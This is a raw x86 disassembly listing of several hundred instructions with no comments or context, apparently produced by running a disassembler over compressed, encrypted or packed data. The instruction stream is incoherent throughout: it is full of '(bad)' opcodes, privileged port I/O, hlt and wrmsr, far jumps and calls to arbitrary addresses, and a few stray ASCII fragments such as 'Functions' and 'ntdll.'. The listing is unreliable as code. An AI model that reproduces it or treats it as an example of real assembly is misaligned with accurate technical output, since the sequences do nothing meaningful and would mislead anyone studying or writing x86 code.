1315a81b:	bb 45 18 83 f8       	mov    $0xf8831845,%ebx
1315a820:	05 fc fe 16 8b       	add    $0x8b16fefc,%eax
1315a825:	fe 8d b5 25 b9 82    	decb   -0x7d46da4b(%ebp)
1315a82b:	70 66                	jo     0x1315a893
1315a82d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315a82e:	ec                   	in     (%dx),%al
1315a82f:	03 f2                	add    %edx,%esi
1315a831:	6d                   	insl   (%dx),%es:(%edi)
1315a832:	4e                   	dec    %esi
1315a833:	46                   	inc    %esi
1315a834:	15 4f 12 fc 50       	adc    $0x50fc124f,%eax
1315a839:	53                   	push   %ebx
1315a83a:	6a a7                	push   $0xffffffa7
1315a83c:	34 5b                	xor    $0x5b,%al
1315a83e:	80 6f 20 04          	subb   $0x4,0x20(%edi)
1315a842:	0c e5                	or     $0xe5,%al
1315a844:	2a 5c 01 9d          	sub    -0x63(%ecx,%eax,1),%bl
1315a848:	7a ec                	jp     0x1315a836
1315a84a:	8a 4e 28             	mov    0x28(%esi),%cl
1315a84d:	83 f8 8b             	cmp    $0xffffff8b,%eax
1315a850:	44                   	inc    %esp
1315a851:	ca 46 b6             	lret   $0xb646
1315a854:	79 10                	jns    0x1315a866
1315a856:	76 62                	jbe    0x1315a8ba
1315a858:	ca 16 79             	lret   $0x7916
1315a85b:	58                   	pop    %eax
1315a85c:	d0 19                	rcrb   $1,(%ecx)
1315a85e:	56                   	push   %esi
1315a85f:	03 f8                	add    %eax,%edi
1315a861:	b2 41                	mov    $0x41,%dl
1315a863:	28 d0                	sub    %dl,%al
1315a865:	f1                   	int1
1315a866:	2e cc                	cs int3
1315a868:	eb 21                	jmp    0x1315a88b
1315a86a:	21 83 61 66 36 b6    	and    %eax,-0x49c9999f(%ebx)
1315a870:	90                   	nop
1315a871:	0d c5 25 50 bb       	or     $0xbb5025c5,%eax
1315a876:	fa                   	cli
1315a877:	ab                   	stos   %eax,%es:(%edi)
1315a878:	6a 28                	push   $0x28
1315a87a:	4c                   	dec    %esp
1315a87b:	18 08                	sbb    %cl,(%eax)
1315a87d:	b5 b1                	mov    $0xb1,%ch
1315a87f:	ff 41 79             	incl   0x79(%ecx)
1315a882:	8a b7 97 ff 74 2f    	mov    0x2f74ff97(%edi),%dh
1315a888:	54                   	push   %esp
1315a889:	12 b5 87 5c cf 5b    	adc    0x5bcf5c87(%ebp),%dh
1315a88f:	27                   	daa
1315a890:	d3 26                	shll   %cl,(%esi)
1315a892:	64 07                	fs pop %es
1315a894:	e1 6f                	loope  0x1315a905
1315a896:	ec                   	in     (%dx),%al
1315a897:	eb d9                	jmp    0x1315a872
1315a899:	29 57 10             	sub    %edx,0x10(%edi)
1315a89c:	cc                   	int3
1315a89d:	c3                   	ret
1315a89e:	db 43 56             	fildl  0x56(%ebx)
1315a8a1:	e7 d0                	out    %eax,$0xd0
1315a8a3:	69 02 10 04 ef d0    	imul   $0xd0ef0410,(%edx),%eax
1315a8a9:	08 7d 38             	or     %bh,0x38(%ebp)
1315a8ac:	e7 66                	out    %eax,$0x66
1315a8ae:	eb 08                	jmp    0x1315a8b8
1315a8b0:	5f                   	pop    %edi
1315a8b1:	f4                   	hlt
1315a8b2:	06                   	push   %es
1315a8b3:	18 82 5d 5b 03 66    	sbb    %al,0x66035b5d(%edx)
1315a8b9:	e9 97 c4 76 f9       	jmp    0xc8c6d55
1315a8be:	f6 20                	mulb   (%eax)
1315a8c0:	76 ea                	jbe    0x1315a8ac
1315a8c2:	05 3b 22 75 0c       	add    $0xc75223b,%eax
1315a8c7:	7b 02                	jnp    0x1315a8cb
1315a8c9:	06                   	push   %es
1315a8ca:	05 9b 6d ee df       	add    $0xdfee6d9b,%eax
1315a8cf:	e1 eb                	loope  0x1315a8bc
1315a8d1:	e0 33                	loopne 0x1315a906
1315a8d3:	ed                   	in     (%dx),%eax
1315a8d4:	8b fb                	mov    %ebx,%edi
1315a8d6:	eb 58                	jmp    0x1315a930
1315a8d8:	1d 10 3d 33 3d       	sbb    $0x3d333d10,%eax
1315a8dd:	1d 04 1e a4 15       	sbb    $0x15a41e04,%eax
1315a8e2:	d0 2b                	shrb   $1,(%ebx)
1315a8e4:	d3 74 03 ea          	shll   %cl,-0x16(%ebx,%eax,1)
1315a8e8:	95                   	xchg   %eax,%ebp
1315a8e9:	08 f3                	or     %dh,%bl
1315a8eb:	84 4a 22             	test   %cl,0x22(%edx)
1315a8ee:	75 dd                	jne    0x1315a8cd
1315a8f0:	43                   	inc    %ebx
1315a8f1:	2c c5                	sub    $0xc5,%al
1315a8f3:	6f                   	outsl  %ds:(%esi),(%dx)
1315a8f4:	95                   	xchg   %eax,%ebp
1315a8f5:	32 78 77             	xor    0x77(%eax),%bh
1315a8f8:	9f                   	lahf
1315a8f9:	3c d5                	cmp    $0xd5,%al
1315a8fb:	c6                   	(bad)
1315a8fc:	6e                   	outsb  %ds:(%esi),(%dx)
1315a8fd:	f1                   	int1
1315a8fe:	09 89 df 8b 3e 4f    	or     %ecx,0x4f3e8bdf(%ecx)
1315a904:	eb 60                	jmp    0x1315a966
1315a906:	44                   	inc    %esp
1315a907:	41                   	inc    %ecx
1315a908:	8a f6                	mov    %dh,%dh
1315a90a:	93                   	xchg   %eax,%ebx
1315a90b:	c9                   	leave
1315a90c:	3e 19 3b             	sbb    %edi,%ds:(%ebx)
1315a90f:	c3                   	ret
1315a910:	76 0f                	jbe    0x1315a921
1315a912:	33 84 dd 6e b7 1c 14 	xor    0x141cb76e(%ebp,%ebx,8),%eax
1315a919:	77 9d                	ja     0x1315a8b8
1315a91b:	02 46 0e             	add    0xe(%esi),%al
1315a91e:	77 f1                	ja     0x1315a911
1315a920:	75 be                	jne    0x1315a8e0
1315a922:	10 d8                	adc    %bl,%al
1315a924:	c8 d9 23 36          	enter  $0x23d9,$0x36
1315a928:	79 97                	jns    0x1315a8c1
1315a92a:	cd 48                	int    $0x48
1315a92c:	12 15 1e 03 f5 05    	adc    0x5f5031e,%dl
1315a932:	28 d2                	sub    %dl,%dl
1315a934:	53                   	push   %ebx
1315a935:	00 c3                	add    %al,%bl
1315a937:	93                   	xchg   %eax,%ebx
1315a938:	e0 02                	loopne 0x1315a93c
1315a93a:	91                   	xchg   %eax,%ecx
1315a93b:	82 c3 21             	add    $0x21,%bl
1315a93e:	68 ff d2 20 2d       	push   $0x2d20d2ff
1315a943:	bd 17 32 cc eb       	mov    $0xebcc3217,%ebp
1315a948:	24 14                	and    $0x14,%al
1315a94a:	e1 f8                	loope  0x1315a944
1315a94c:	e2 6c                	loop   0x1315a9ba
1315a94e:	d5 42                	aad    $0x42
1315a950:	e8 c7 ad 46 0a       	call   0x1d5c571c
1315a955:	3c 24                	cmp    $0x24,%al
1315a957:	36 a8 03             	ss test $0x3,%al
1315a95a:	86 03                	xchg   %al,(%ebx)
1315a95c:	4e                   	dec    %esi
1315a95d:	74 1a                	je     0x1315a979
1315a95f:	e1 55                	loope  0x1315a9b6
1315a961:	93                   	xchg   %eax,%ebx
1315a962:	2d 97 d1 ac 52       	sub    $0x52acd197,%eax
1315a967:	b4 bd                	mov    $0xbd,%ah
1315a969:	09 69 04             	or     %ebp,0x4(%ecx)
1315a96c:	a8 10                	test   $0x10,%al
1315a96e:	75 25                	jne    0x1315a995
1315a970:	c0 04 9f 4b          	rolb   $0x4b,(%edi,%ebx,4)
1315a974:	b3 aa                	mov    $0xaa,%bl
1315a976:	2f                   	das
1315a977:	ec                   	in     (%dx),%al
1315a978:	dc f7                	fdiv   %st,%st(7)
1315a97a:	8b fc                	mov    %esp,%edi
1315a97c:	bc dc 51 03 d9       	mov    $0xd90351dc,%esp
1315a981:	c6                   	(bad)
1315a982:	2a 48 28             	sub    0x28(%eax),%cl
1315a985:	84 85 c1 00 7c 5d    	test   %al,0x5d7c00c1(%ebp)
1315a98b:	c4 ad 52 0f 84 eb    	les    -0x147bf0ae(%ebp),%ebp
1315a991:	56                   	push   %esi
1315a992:	da dc                	fcmovu %st(4),%st
1315a994:	a2 86 85 a0 a6       	mov    %al,0xa6a08586
1315a999:	d7                   	xlat   %ds:(%ebx)
1315a99a:	34 cb                	xor    $0xcb,%al
1315a99c:	ee                   	out    %al,(%dx)
1315a99d:	1b dd                	sbb    %ebp,%ebx
1315a99f:	93                   	xchg   %eax,%ebx
1315a9a0:	f4                   	hlt
1315a9a1:	3d 07 5e 77 61       	cmp    $0x61775e07,%eax
1315a9a6:	14 47                	adc    $0x47,%al
1315a9a8:	66 c7                	data16 (bad)
1315a9aa:	09 2b                	or     %ebp,(%ebx)
1315a9ac:	ff                   	lcall  (bad)
1315a9ad:	dd fd                	(bad)
1315a9af:	40                   	inc    %eax
1315a9b0:	83 c2 02             	add    $0x2,%edx
1315a9b3:	3d 08 08 75 f0       	cmp    $0xf0750808,%eax
1315a9b8:	b8 06 8d 94 24       	mov    $0x24948d06,%eax
1315a9bd:	12 04 1b             	adc    (%ebx,%ebx,1),%al
1315a9c0:	42                   	inc    %edx
1315a9c1:	a3 45 17 1a 48       	mov    %eax,0x481a1745
1315a9c6:	60                   	pusha
1315a9c7:	68 01 0e fb 77       	push   $0x77fb0e01
1315a9cc:	e1 04                	loope  0x1315a9d2
1315a9ce:	5f                   	pop    %edi
1315a9cf:	11 84 5c 18 eb 51 eb 	adc    %eax,-0x14ae14e8(%esp,%ebx,2)
1315a9d6:	09 0b                	or     %ecx,(%ebx)
1315a9d8:	43                   	inc    %ebx
1315a9d9:	c0 36 bc             	shlb   $0xbc,(%esi)
1315a9dc:	c5 18                	lds    (%eax),%ebx
1315a9de:	9f                   	lahf
1315a9df:	5c                   	pop    %esp
1315a9e0:	74 05                	je     0x1315a9e7
1315a9e2:	58                   	pop    %eax
1315a9e3:	75 e8                	jne    0x1315a9cd
1315a9e5:	27                   	daa
1315a9e6:	39 0e                	cmp    %ecx,(%esi)
1315a9e8:	16                   	push   %ss
1315a9e9:	fb                   	sti
1315a9ea:	43                   	inc    %ebx
1315a9eb:	8d 84 48 9a 75 1a 79 	lea    0x791a759a(%eax,%ecx,2),%eax
1315a9f2:	76 b2                	jbe    0x1315a9a6
1315a9f4:	31 b3 11 16 d5 1c    	xor    %esi,0x1cd51611(%ebx)
1315a9fa:	b4 75                	mov    $0x75,%ah
1315a9fc:	07                   	pop    %es
1315a9fd:	41                   	inc    %ecx
1315a9fe:	5c                   	pop    %esp
1315a9ff:	50                   	push   %eax
1315aa00:	b0 ed                	mov    $0xed,%al
1315aa02:	3c 5f                	cmp    $0x5f,%al
1315aa04:	7e b3                	jle    0x1315a9b9
1315aa06:	11 08                	adc    %ecx,(%eax)
1315aa08:	99                   	cltd
1315aa09:	ae                   	scas   %es:(%edi),%al
1315aa0a:	20 17                	and    %dl,(%edi)
1315aa0c:	03 24 08             	add    (%eax,%ecx,1),%esp
1315aa0f:	5f                   	pop    %edi
1315aa10:	b0 e6                	mov    $0xe6,%al
1315aa12:	e0 8c                	loopne 0x1315a9a0
1315aa14:	b0 84                	mov    $0x84,%al
1315aa16:	54                   	push   %esp
1315aa17:	0d 84 cd 0c 4e       	or     $0x4e0ccd84,%eax
1315aa1c:	aa                   	stos   %al,%es:(%edi)
1315aa1d:	dc 37                	fdivl  (%edi)
1315aa1f:	7c 29                	jl     0x1315aa4a
1315aa21:	50                   	push   %eax
1315aa22:	a8 b7                	test   $0xb7,%al
1315aa24:	f4                   	hlt
1315aa25:	17                   	pop    %ss
1315aa26:	54                   	push   %esp
1315aa27:	00 68 c7             	add    %ch,-0x39(%eax)
1315aa2a:	f1                   	int1
1315aa2b:	1e                   	push   %ds
1315aa2c:	60                   	pusha
1315aa2d:	0a 78 06             	or     0x6(%eax),%bh
1315aa30:	86 07                	xchg   %al,(%edi)
1315aa32:	24 9a                	and    $0x9a,%al
1315aa34:	91                   	xchg   %eax,%ecx
1315aa35:	9a 8e a2 49 2c c2 52 	lcall  $0x52c2,$0x2c49a28e
1315aa3c:	33 03                	xor    (%ebx),%eax
1315aa3e:	01 ac 2d 9f 7c 80 53 	add    %ebp,0x53807c9f(%ebp,%ebp,1)
1315aa45:	d8 83 fb 36 15 0e    	fadds  0xe1536fb(%ebx)
1315aa4b:	4c                   	dec    %esp
1315aa4c:	c0 e6 60             	shl    $0x60,%dh
1315aa4f:	b4 2c                	mov    $0x2c,%ah
1315aa51:	43                   	inc    %ebx
1315aa52:	89 31                	mov    %esi,(%ecx)
1315aa54:	23 d0                	and    %eax,%edx
1315aa56:	0e                   	push   %cs
1315aa57:	d4 06                	aam    $0x6
1315aa59:	34 41                	xor    $0x41,%al
1315aa5b:	00 0c 68             	add    %cl,(%eax,%ebp,2)
1315aa5e:	05 07 4a 37 05       	add    $0x5374a07,%eax
1315aa63:	b6 66                	mov    $0x66,%dh
1315aa65:	b6 49                	mov    $0x49,%dh
1315aa67:	c7                   	(bad)
1315aa68:	2b 34 53             	sub    (%ebx,%edx,2),%esi
1315aa6b:	34 2b                	xor    $0x2b,%al
1315aa6d:	8b 7d f6             	mov    -0xa(%ebp),%edi
1315aa70:	61                   	popa
1315aa71:	19 d1                	sbb    %edx,%ecx
1315aa73:	0c a7                	or     $0xa7,%al
1315aa75:	b6 c8                	mov    $0xc8,%dh
1315aa77:	02 02                	add    (%edx),%al
1315aa79:	97                   	xchg   %eax,%edi
1315aa7a:	76 67                	jbe    0x1315aae3
1315aa7c:	cb                   	lret
1315aa7d:	01 04 2d 5c a3 00 5a 	add    %eax,0x5a00a35c(,%ebp,1)
1315aa84:	d9 11                	fsts   (%ecx)
1315aa86:	02 28                	add    (%eax),%ch
1315aa88:	68 c6 dc 2e 32       	push   $0x322edcc6
1315aa8d:	b1 00                	mov    $0x0,%cl
1315aa8f:	ff 00                	incl   (%eax)
1315aa91:	5e                   	pop    %esi
1315aa92:	f1                   	int1
1315aa93:	fa                   	cli
1315aa94:	ef                   	out    %eax,(%dx)
1315aa95:	0f 46 75 6e          	cmovbe 0x6e(%ebp),%esi
1315aa99:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
1315aa9d:	6e                   	outsb  %ds:(%esi),(%dx)
1315aa9e:	73 eb                	jae    0x1315aa8b
1315aaa0:	73 81                	jae    0x1315aa23
1315aaa2:	d0 17                	rclb   $1,(%edi)
1315aaa4:	b1 e6                	mov    $0xe6,%cl
1315aaa6:	24 d8                	and    $0xd8,%al
1315aaa8:	c9                   	leave
1315aaa9:	0d 81 cb ea bb       	or     $0xbbeacb81,%eax
1315aaae:	5a                   	pop    %edx
1315aaaf:	1f                   	pop    %ds
1315aab0:	fc                   	cld
1315aab1:	d5 23                	aad    $0x23
1315aab3:	f0 a7                	lock cmpsl %es:(%edi),%ds:(%esi)
1315aab5:	72 2b                	jb     0x1315aae2
1315aab7:	e5 8b                	in     $0x8b,%eax
1315aab9:	15 fc 59 de 35       	adc    $0x35de59fc,%eax
1315aabe:	a1 80 b5 8a 38       	mov    0x388ab580,%eax
1315aac3:	6c                   	insb   (%dx),%es:(%edi)
1315aac4:	20 af 5e 13 68 01    	and    %ch,0x168135e(%edi)
1315aaca:	2a f3                	sub    %bl,%dh
1315aacc:	7d eb                	jge    0x1315aab9
1315aace:	04 19                	add    $0x19,%al
1315aad0:	fa                   	cli
1315aad1:	96                   	xchg   %eax,%esi
1315aad2:	3f                   	aas
1315aad3:	35 2e 7d 83 cb       	xor    $0xcb837d2e,%eax
1315aad8:	22 27                	and    (%edi),%ah
1315aada:	c2 5a 4c             	ret    $0x4c5a
1315aadd:	44                   	inc    %esp
1315aade:	75 64                	jne    0x1315ab44
1315aae0:	54                   	push   %esp
1315aae1:	85 21                	test   %esp,(%ecx)
1315aae3:	e2 4d                	loop   0x1315ab32
1315aae5:	47                   	inc    %edi
1315aae6:	0f 39                	(bad)
1315aae8:	64 34 f2             	fs xor $0xf2,%al
1315aaeb:	70 34                	jo     0x1315ab21
1315aaed:	5b                   	pop    %ebx
1315aaee:	83 cf 06             	or     $0x6,%edi
1315aaf1:	8c 26                	mov    %fs,(%esi)
1315aaf3:	a3 ff 59 d8 6f       	mov    %eax,0x6fd859ff
1315aaf8:	17                   	pop    %ss
1315aaf9:	77 2b                	ja     0x1315ab26
1315aafb:	78 23                	js     0x1315ab20
1315aafd:	62 13                	bound  %edx,(%ebx)
1315aaff:	eb 05                	jmp    0x1315ab06
1315ab01:	56                   	push   %esi
1315ab02:	0b 4b 16             	or     0x16(%ebx),%ecx
1315ab05:	9c                   	pushf
1315ab06:	0c 5a                	or     $0x5a,%al
1315ab08:	7f 66                	jg     0x1315ab70
1315ab0a:	3b 74 58 fe          	cmp    -0x2(%eax,%ebx,2),%esi
1315ab0e:	75 f1                	jne    0x1315ab01
1315ab10:	3f                   	aas
1315ab11:	ee                   	out    %al,(%dx)
1315ab12:	3b 5b 4d             	cmp    0x4d(%ebx),%ebx
1315ab15:	16                   	push   %ss
1315ab16:	82 91 a3 c7 27 9b 32 	adcb   $0x32,-0x64d8385d(%ecx)
1315ab1d:	8a 77 e6             	mov    -0x1a(%edi),%dh
1315ab20:	f0 75 66             	lock jne 0x1315ab89
1315ab23:	ba 92 ed 07 89       	mov    $0x8907ed92,%edx
1315ab28:	5c                   	pop    %esp
1315ab29:	40                   	inc    %eax
1315ab2a:	4a                   	dec    %edx
1315ab2b:	c8 40 75 0f          	enter  $0x7540,$0xf
1315ab2f:	0e                   	push   %cs
1315ab30:	2f                   	das
1315ab31:	03 7b c2             	add    -0x3e(%ebx),%edi
1315ab34:	da 68 1d             	fisubrl 0x1d(%eax)
1315ab37:	74 1e                	je     0x1315ab57
1315ab39:	53                   	push   %ebx
1315ab3a:	0f bd b0 43 12 7d eb 	bsr    -0x1482edbd(%eax),%esi
1315ab41:	2b 3b                	sub    (%ebx),%edi
1315ab43:	1c 53                	sbb    $0x53,%al
1315ab45:	f2 08 89 81 0f aa f7 	repnz or %cl,-0x855f07f(%ecx)
1315ab4c:	5b                   	pop    %ebx
1315ab4d:	c4 59 88             	les    -0x78(%ecx),%ebx
1315ab50:	05 a3 c0 59 74       	add    $0x7459c0a3,%eax
1315ab55:	38 92 ab ae 8a 10    	cmp    %dl,0x108aaeab(%edx)
1315ab5b:	85 68 7a             	test   %ebp,0x7a(%eax)
1315ab5e:	06                   	push   %es
1315ab5f:	8f                   	(bad)
1315ab60:	60                   	pusha
1315ab61:	72 4b                	jb     0x1315abae
1315ab63:	f8                   	clc
1315ab64:	4d                   	dec    %ebp
1315ab65:	15 33 78 48 18       	adc    $0x18487833,%eax
1315ab6a:	b2 75                	mov    $0x75,%dl
1315ab6c:	3a 14 6a             	cmp    (%edx,%ebp,2),%dl
1315ab6f:	5b                   	pop    %ebx
1315ab70:	92                   	xchg   %eax,%edx
1315ab71:	30 50 13             	xor    %dl,0x13(%eax)
1315ab74:	79 47                	jns    0x1315abbd
1315ab76:	14 cd                	adc    $0xcd,%al
1315ab78:	d5 5d                	aad    $0x5d
1315ab7a:	75 7d                	jne    0x1315abf9
1315ab7c:	58                   	pop    %eax
1315ab7d:	63 72 00             	arpl   %esi,0x0(%edx)
1315ab80:	65 67 03 78 25       	add    %gs:0x25(%bx,%si),%edi
1315ab85:	58                   	pop    %eax
1315ab86:	82 20 51             	andb   $0x51,(%eax)
1315ab89:	41                   	inc    %ecx
1315ab8a:	57                   	push   %edi
1315ab8b:	00 32                	add    %dh,(%edx)
1315ab8d:	4a                   	dec    %edx
1315ab8e:	cf                   	iret
1315ab8f:	28 4b 8b             	sub    %cl,-0x75(%ebx)
1315ab92:	ea 39 f3 64 59 3e 19 	ljmp   $0x193e,$0x5964f339
1315ab99:	50                   	push   %eax
1315ab9a:	f8                   	clc
1315ab9b:	83 ff 4a             	cmp    $0x4a,%edi
1315ab9e:	57                   	push   %edi
1315ab9f:	c1 e4 83             	shl    $0x83,%esp
1315aba2:	47                   	inc    %edi
1315aba3:	e2 25                	loop   0x1315abca
1315aba5:	57                   	push   %edi
1315aba6:	e1 98                	loope  0x1315ab40
1315aba8:	23 12                	and    (%edx),%edx
1315abaa:	8e e9                	mov    %ecx,%gs
1315abac:	8f                   	(bad)
1315abad:	3b 9c 6a 52 73 b1 5c 	cmp    0x5cb17352(%edx,%ebp,2),%ebx
1315abb4:	1b d9                	sbb    %ecx,%ebx
1315abb6:	13 f0                	adc    %eax,%esi
1315abb8:	c3                   	ret
1315abb9:	c1 3b b5             	sarl   $0xb5,(%ebx)
1315abbc:	b1 27                	mov    $0x27,%cl
1315abbe:	34 a6                	xor    $0xa6,%al
1315abc0:	8b 0b                	mov    (%ebx),%ecx
1315abc2:	f0 01 89 e0 3c 1b 8b 	lock add %ecx,-0x74e4c320(%ecx)
1315abc9:	d9 b1 01 8d d6 bf    	fnstenv -0x402972ff(%ecx)
1315abcf:	3d 1b 48 22 7c       	cmp    $0x7c22481b,%eax
1315abd4:	10 40 8a             	adc    %al,-0x76(%eax)
1315abd7:	1a 3a                	sbb    (%edx),%bh
1315abd9:	1e                   	push   %ds
1315abda:	c3                   	ret
1315abdb:	d3 9d 40 c3 0b f1    	rcrl   %cl,-0xef43cc0(%ebp)
1315abe1:	46                   	inc    %esi
1315abe2:	42                   	inc    %edx
1315abe3:	48                   	dec    %eax
1315abe4:	e7 c1                	out    %eax,$0xc1
1315abe6:	47                   	inc    %edi
1315abe7:	56                   	push   %esi
1315abe8:	b8 df cb d3 21       	mov    $0x21d3cbdf,%eax
1315abed:	c1 0a 0a             	rorl   $0xa,(%edx)
1315abf0:	88 0e                	mov    %cl,(%esi)
1315abf2:	1b f7                	sbb    %edi,%esi
1315abf4:	5e                   	pop    %esi
1315abf5:	17                   	pop    %ss
1315abf6:	8c 1f                	mov    %ds,(%edi)
1315abf8:	82 2c 27 c8          	subb   $0xc8,(%edi,%eiz,1)
1315abfc:	21 68 48             	and    %ebp,0x48(%eax)
1315abff:	5d                   	pop    %ebp
1315ac00:	89 fd                	mov    %edi,%ebp
1315ac02:	cd fd                	int    $0xfd
1315ac04:	78 3b                	js     0x1315ac41
1315ac06:	1c 56                	sbb    $0x56,%al
1315ac08:	b2 4d                	mov    $0x4d,%dl
1315ac0a:	20 3b                	and    %bh,(%ebx)
1315ac0c:	9b                   	fwait
1315ac0d:	6e                   	outsb  %ds:(%esi),(%dx)
1315ac0e:	74 64                	je     0x1315ac74
1315ac10:	6c                   	insb   (%dx),%es:(%edi)
1315ac11:	6c                   	insb   (%dx),%es:(%edi)
1315ac12:	2e cb                	cs lret
1315ac14:	a0 73 cf 03 eb       	mov    0xeb03cf73,%al
1315ac19:	48                   	dec    %eax
1315ac1a:	e6 01                	out    %al,$0x1
1315ac1c:	e8 d8 58 e9 1a       	call   0x2dff04f9
1315ac21:	61                   	popa
1315ac22:	9a 0e 0b b4 05 2c c5 	lcall  $0xc52c,$0x5b40b0e
1315ac29:	da f7                	(bad)
1315ac2b:	14 6a                	adc    $0x6a,%al
1315ac2d:	05 44 84 93 7b       	add    $0x7b938444,%eax
1315ac32:	22 e4                	and    %ah,%ah
1315ac34:	6a 5b                	push   $0x5b
1315ac36:	3e 01 cf             	ds add %ecx,%edi
1315ac39:	4d                   	dec    %ebp
1315ac3a:	50                   	push   %eax
1315ac3b:	f5                   	cmc
1315ac3c:	0d 1c 02 be 30       	or     $0x30be021c,%eax
1315ac41:	84 97 34 8d 4d fc    	test   %dl,-0x3b272cc(%edi)
1315ac47:	51                   	push   %ecx
1315ac48:	f6 bd 52 d0 aa 8b    	idivb  -0x74552fae(%ebp)
1315ac4e:	4f                   	dec    %edi
1315ac4f:	dd 64 86 59          	frstor 0x59(%esi,%eax,4)
1315ac53:	c0 b3 bd 7c 3e 74 59 	shlb   $0x59,0x743e7cbd(%ebx)
1315ac5a:	bb 42 46 a2 bd       	mov    $0xbda24642,%ebx
1315ac5f:	77 75                	ja     0x1315acd6
1315ac61:	47                   	inc    %edi
1315ac62:	94                   	xchg   %eax,%esp
1315ac63:	04 93                	add    $0x93,%al
1315ac65:	68 c2 07 1f 62       	push   $0x621f07c2
1315ac6a:	54                   	push   %esp
1315ac6b:	0b 96 ec 50 17 05    	or     0x51750ec(%esi),%edx
1315ac71:	82 25 16 7a 35 9c f4 	andb   $0xf4,0x9c357a16
1315ac78:	a1 29 f8 d2 b7       	mov    0xb7d2f829,%eax
1315ac7d:	3b 05 77 2a 8b 75    	cmp    0x758b2a77,%eax
1315ac83:	87 f6                	xchg   %esi,%esi
1315ac85:	7c 23                	jl     0x1315acaa
1315ac87:	46                   	inc    %esi
1315ac88:	78 6e                	js     0x1315acf8
1315ac8a:	89 3a                	mov    %edi,(%edx)
1315ac8c:	5a                   	pop    %edx
1315ac8d:	26 4f                	es dec %edi
1315ac8f:	8d 7a cf             	lea    -0x31(%edx),%edi
1315ac92:	4a                   	dec    %edx
1315ac93:	f4                   	hlt
1315ac94:	bb 1b f0 4c e0       	mov    $0xe04cf01b,%ebx
1315ac99:	3c 01                	cmp    $0x1,%al
1315ac9b:	18 43 01             	sbb    %al,0x1(%ebx)
1315ac9e:	32 eb                	xor    %bl,%ch
1315aca0:	04 43                	add    $0x43,%al
1315aca2:	4e                   	dec    %esi
1315aca3:	75 e0                	jne    0x1315ac85
1315aca5:	16                   	push   %ss
1315aca6:	0d a1 4a 37 0e       	or     $0xe374aa1,%eax
1315acab:	9f                   	lahf
1315acac:	fc                   	cld
1315acad:	11 50 48             	adc    %edx,0x48(%eax)
1315acb0:	6d                   	insl   (%dx),%es:(%edi)
1315acb1:	eb 45                	jmp    0x1315acf8
1315acb3:	ff 01                	incl   (%ecx)
1315acb5:	f8                   	clc
1315acb6:	28 88 15 6a d6 00    	sub    %cl,0xd66a15(%eax)
1315acbc:	d9 a0 44 4d 09 51    	fldenv 0x51094d44(%eax)
1315acc2:	0f 86 f4 3d e4 93    	jbe    0xa6f9eabc
1315acc8:	23 f9                	and    %ecx,%edi
1315acca:	5e                   	pop    %esi
1315accb:	6a 0d                	push   $0xd
1315accd:	1c 1c                	sbb    $0x1c,%al
1315accf:	2b c9                	sub    %ecx,%ecx
1315acd1:	37                   	aaa
1315acd2:	58                   	pop    %eax
1315acd3:	d1 4a 1d             	rorl   $1,0x1d(%edx)
1315acd6:	db 1f                	fistpl (%edi)
1315acd8:	83 99 00 de d6 e3 0a 	sbbl   $0xa,-0x1c292200(%ecx)
1315acdf:	0c 45                	or     $0x45,%al
1315ace1:	1b 28                	sbb    (%eax),%ebp
1315ace3:	40                   	inc    %eax
1315ace4:	ef                   	out    %eax,(%dx)
1315ace5:	19 03                	sbb    %eax,(%ebx)
1315ace7:	89 2c 86             	mov    %ebp,(%esi,%eax,4)
1315acea:	b9 93 e6 68 e6       	mov    $0xe668e693,%ecx
1315acef:	30 1f                	xor    %bl,(%edi)
1315acf1:	c8 68 90 ac          	enter  $0x9068,$0xac
1315acf5:	3b ef                	cmp    %edi,%ebp
1315acf7:	86 00                	xchg   %al,(%eax)
1315acf9:	21 10                	and    %edx,(%eax)
1315acfb:	6a cf                	push   $0xffffffcf
1315acfd:	60                   	pusha
1315acfe:	47                   	inc    %edi
1315acff:	bb 3c 04 1d f3       	mov    $0xf31d043c,%ebx
1315ad04:	8a 03                	mov    (%ebx),%al
1315ad06:	e4 49                	in     $0x49,%al
1315ad08:	34 84                	xor    $0x84,%al
1315ad0a:	07                   	pop    %es
1315ad0b:	cf                   	iret
1315ad0c:	4b                   	dec    %ebx
1315ad0d:	5f                   	pop    %edi
1315ad0e:	db 64 be 9c          	(bad) -0x64(%esi,%edi,4)
1315ad12:	6c                   	insb   (%dx),%es:(%edi)
1315ad13:	d6                   	salc
1315ad14:	14 b8                	adc    $0xb8,%al
1315ad16:	b8 c0 43 b8 b4       	mov    $0xb4b843c0,%eax
1315ad1b:	09 40 1e             	or     %eax,0x1e(%eax)
1315ad1e:	12 0c 79             	adc    (%ecx,%edi,2),%cl
1315ad21:	52                   	push   %edx
1315ad22:	5f                   	pop    %edi
1315ad23:	c4                   	(bad)
1315ad24:	da ef                	(bad)
1315ad26:	40                   	inc    %eax
1315ad27:	4f                   	dec    %edi
1315ad28:	2d 50 5c 03 2b       	sub    $0x2b035c50,%eax
1315ad2d:	56                   	push   %esi
1315ad2e:	ea ef 12 97 83 2d 46 	ljmp   $0x462d,$0x839712ef
1315ad35:	01 73 0a             	add    %esi,0xa(%ebx)
1315ad38:	5a                   	pop    %edx
1315ad39:	82 09 a9             	orb    $0xa9,(%ecx)
1315ad3c:	a0 70 23 e1 7f       	mov    0x7fe12370,%al
1315ad41:	9d                   	popf
1315ad42:	60                   	pusha
1315ad43:	7a 51                	jp     0x1315ad96
1315ad45:	cc                   	int3
1315ad46:	60                   	pusha
1315ad47:	e1 d4                	loope  0x1315ad1d
1315ad49:	df a2 d6 28 cd 8b    	fbld   -0x7432d72a(%edx)
1315ad4f:	df fa                	(bad)
1315ad51:	41                   	inc    %ecx
1315ad52:	3c 99                	cmp    $0x99,%al
1315ad54:	03 e0                	add    %eax,%esp
1315ad56:	f6 c8 02             	test   $0x2,%al
1315ad59:	d3 13                	rcll   %cl,(%ebx)
1315ad5b:	08 8b 70 10 78 34    	or     %cl,0x34781070(%ebx)
1315ad61:	b6 c7                	mov    $0xc7,%dh
1315ad63:	38 83 95 57 02 b4    	cmp    %al,-0x4bfda86b(%ebx)
1315ad69:	6a 40                	push   $0x40
1315ad6b:	0f 30                	wrmsr
1315ad6d:	02 96 98 19 5d 0e    	add    0xe5d1998(%esi),%dl
1315ad73:	c4                   	(bad)
1315ad74:	e8 6c b0 91 b6       	call   0xc9a75de5
1315ad79:	05 40 be 56 4b       	add    $0x4b56be40,%eax
1315ad7e:	50                   	push   %eax
1315ad7f:	1a 01                	sbb    (%ecx),%al
1315ad81:	ba 5b e3 d4 2e       	mov    $0x2ed4e35b,%edx
